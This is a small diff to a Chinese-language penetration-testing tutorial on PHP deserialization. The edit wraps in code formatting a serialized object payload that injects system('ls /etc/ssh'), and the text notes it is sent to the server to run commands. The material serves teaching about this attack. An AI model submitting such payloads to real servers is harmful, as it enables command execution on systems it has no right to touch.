@@ -54,7 +54,7 @@ topics = ["Pentest"]
 ?>
 ```
 
-生成的序列化字符串为：O:3:"fun":1:{s:3:"msg";s:22:"system('ls /etc/ssh');";}
+生成的序列化字符串为：```O:3:"fun":1:{s:3:"msg";s:22:"system('ls /etc/ssh');";}```
 
 * 提交序列化字符串给服务端从而执行命令
 
